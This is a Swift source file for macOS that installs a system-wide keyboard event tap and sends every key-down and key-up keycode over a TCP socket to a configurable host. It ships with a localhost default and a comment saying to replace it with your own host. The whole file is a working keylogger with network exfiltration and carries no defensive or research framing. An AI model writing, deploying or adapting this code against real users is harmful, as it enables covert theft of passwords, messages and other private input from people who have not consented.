import Cocoa
import Foundation
import CoreGraphics

// Configuration
let socketHost = "127.0.0.1" // Replace with your socket host
let socketPort: UInt16 = 12345 // Replace with your socket port

// Setup socket connection
func setupSocket() -> OutputStream? {
    var readStream: Unmanaged<CFReadStream>?
    var writeStream: Unmanaged<CFWriteStream>?

    CFStreamCreatePairWithSocketToHost(kCFAllocatorDefault,
                                       socketHost as CFString,
                                       socketPort,
                                       &readStream,
                                       &writeStream)
    guard let outputStream = writeStream?.takeRetainedValue() else {
        print("Failed to create output stream")
        return nil
    }

    outputStream.open()
    return outputStream
}

// Send data to socket
func sendToSocket(stream: OutputStream, data: String) {
    if let dataToSend = data.data(using: .utf8) {
        dataToSend.withUnsafeBytes { (buffer: UnsafeRawBufferPointer) in
            if let baseAddress = buffer.baseAddress?.assumingMemoryBound(to: UInt8.self) {
                stream.write(baseAddress, maxLength: dataToSend.count)
            }
        }
    }
}

// Create the event tap
let eventMask = (1 << CGEventType.keyDown.rawValue) | (1 << CGEventType.keyUp.rawValue)

guard let eventTap = CGEvent.tapCreate(
    tap: .cgSessionEventTap,
    place: .headInsertEventTap,
    options: .defaultTap,
    eventsOfInterest: CGEventMask(eventMask),
    callback: { (proxy, type, event, refcon) -> Unmanaged<CGEvent>? in
        let keyCode = event.getIntegerValueField(.keyboardEventKeycode)
        let keyDown = type == .keyDown
        let keyEvent = keyDown ? "KeyDown: \(keyCode)\n" : "KeyUp: \(keyCode)\n"

        if let stream = refcon {
            let outputStream = Unmanaged<OutputStream>.fromOpaque(refcon!).takeUnretainedValue()
            sendToSocket(stream: outputStream, data: keyEvent)
        }

        return Unmanaged.passUnretained(event)
    },
    userInfo: nil
) else {
    print("Failed to create event tap. Ensure the app has Accessibility permissions.")
    exit(1)
}

let outputStream = setupSocket()
if let stream = outputStream {
    // Pass the stream as userInfo
    let context = UnsafeMutableRawPointer(Unmanaged.passUnretained(stream).toOpaque())
    let newEventTap = CGEvent.tapCreate(
        tap: .cgSessionEventTap,
        place: .headInsertEventTap,
        options: .defaultTap,
        eventsOfInterest: CGEventMask(eventMask),
        callback: { (proxy, type, event, refcon) -> Unmanaged<CGEvent>? in
            let keyCode = event.getIntegerValueField(.keyboardEventKeycode)
            let keyDown = type == .keyDown
            let keyEvent = keyDown ? "KeyDown: \(keyCode)\n" : "KeyUp: \(keyCode)\n"

            if let refcon = refcon {
                let outputStream = Unmanaged<OutputStream>.fromOpaque(refcon).takeUnretainedValue()
                sendToSocket(stream: outputStream, data: keyEvent)
            }

            return Unmanaged.passUnretained(event)
        },
        userInfo: context
    )

    guard let finalEventTap = newEventTap else {
        print("Failed to create event tap with userInfo.")
        exit(1)
    }

    let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, finalEventTap, 0)
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)
    CGEvent.tapEnable(tap: finalEventTap, enable: true)
    print("Listening for keyboard events...")

    CFRunLoopRun()
} else {
    print("Unable to establish socket connection.")
    exit(1)
}

